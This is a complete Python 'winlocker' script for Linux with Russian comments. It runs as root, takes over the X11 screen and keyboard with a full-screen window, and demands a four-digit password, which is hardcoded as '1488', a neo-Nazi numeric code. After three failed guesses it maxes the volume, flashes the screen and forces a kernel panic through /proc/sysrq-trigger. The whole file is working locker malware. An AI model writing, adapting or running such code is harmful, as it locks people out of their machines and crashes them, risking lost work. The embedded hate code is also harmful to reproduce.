#!/usr/bin/env python3
import os
import sys
import time
import threading
from Xlib import X, XK
from Xlib.display import Display
import subprocess

PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS

# ---------- Громкий звук ----------
def play_loud_sound():
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    # Можно заменить на любой громкий .wav, если путь отличается:
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

# ---------- Уничтожение системы ----------
def trigger_kernel_panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")

# ---------- Захват экрана и клавиатуры через X11 ----------
class GrabLocker:
    def __init__(self):
        self.display = Display()
        self.screen = self.display.screen()
        self.root = self.screen.root
        self.width = self.screen.width_in_pixels
        self.height = self.screen.height_in_pixels

        # Получаем colormap для экрана
        self.colormap = self.screen.default_colormap

        # Цвета (пиксели)
        self.color_black = self.screen.black_pixel
        # Получаем зелёный, красный, белый через colormap
        self.color_green = self.colormap.alloc_color(0, 65535, 0).pixel
        self.color_red = self.colormap.alloc_color(65535, 0, 0).pixel
        self.color_white = self.colormap.alloc_color(65535, 65535, 65535).pixel

        # Создаём чёрное полноэкранное окно
        self.window = self.root.create_window(
            0, 0, self.width, self.height, 0,
            self.screen.root_depth,
            X.InputOutput,
            X.CopyFromParent,
            background_pixel=self.color_black,
            event_mask=X.KeyPressMask | X.KeyReleaseMask | X.ExposureMask,
            override_redirect=True,
        )
        self.window.map()
        self.display.flush()

        # Захватываем клавиатуру
        self.window.grab_keyboard(
            True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime
        )
        self.display.flush()

        # Графический контекст
        self.gc = self.window.create_gc(
            foreground=self.color_green,
            background=self.color_black,
        )

        self.input_buffer = ""
        self.running = True

    def draw_text(self, text, y, color="green"):
        """Рисует строку по центру."""
        if color == "green":
            self.gc.change(foreground=self.color_green)
        elif color == "red":
            self.gc.change(foreground=self.color_red)
        elif color == "white":
            self.gc.change(foreground=self.color_white)
        else:
            self.gc.change(foreground=self.color_green)

        font = self.display.open_font("fixed")
        self.window.draw_text(font, self.gc, self.width//2 - 200, y, text.encode())
        self.display.flush()

    def redraw_screen(self):
        self.window.clear_area(0, 0, self.width, self.height)

        self.draw_text("ВЫ ПОПАЛИ НА ВИНЛОК. УГАДАЙТЕ ПАРОЛЬ У ВАС 3 ПОПЫТКИ", 50, "green")
        self.draw_text("(четырёхзначный пароль)", 90, "green")
        self.draw_text(f"ОСТАЛОСЬ {attempts_left} ПОПЫТКИ", 140, "green")

        stars = "*" * len(self.input_buffer)
        self.draw_text(f"> {stars}", 200, "green")

        keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
        for i, line in enumerate(keys):
            self.draw_text(line, 260 + i*40, "green")

    def start(self):
        self.redraw_screen()
        while self.running:
            event = self.display.next_event()
            if event.type == X.KeyPress:
                self.handle_keypress(event)
            elif event.type == X.Expose:
                self.redraw_screen()

    def handle_keypress(self, event):
        global attempts_left
        keysym = self.display.keycode_to_keysym(event.detail, 0)
        if keysym == XK.XK_Return:
            self.check_password()
        elif keysym == XK.XK_BackSpace:
            self.input_buffer = self.input_buffer[:-1]
            self.redraw_screen()
        elif keysym in (XK.XK_0, XK.XK_1, XK.XK_2, XK.XK_3, XK.XK_4,
                        XK.XK_5, XK.XK_6, XK.XK_7, XK.XK_8, XK.XK_9):
            if len(self.input_buffer) < 4:
                self.input_buffer += chr(keysym)
                self.redraw_screen()

    def check_password(self):
        global attempts_left
        if self.input_buffer == PASSWORD:
            self.cleanup()
            sys.exit(0)
        else:
            self.input_buffer = ""
            attempts_left -= 1
            if attempts_left <= 0:
                self.running = False
                self.trigger_failure()
            else:
                self.redraw_screen()

    def trigger_failure(self):
        threading.Thread(target=play_loud_sound, daemon=True).start()
        self.flash_screen()
        threading.Timer(5.0, trigger_kernel_panic).start()

    def flash_screen(self):
        for i in range(10):
            color_pixel = self.color_red if i % 2 == 0 else self.color_white
            self.window.change_attributes(background_pixel=color_pixel)
            self.display.flush()
            time.sleep(0.1)
        self.window.change_attributes(background_pixel=self.color_black)
        self.display.flush()

    def cleanup(self):
        self.display.ungrab_keyboard(X.CurrentTime)
        self.window.destroy()
        self.display.close()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Запустите скрипт с правами root (sudo).")
        sys.exit(1)
    locker = GrabLocker()
    locker.start()
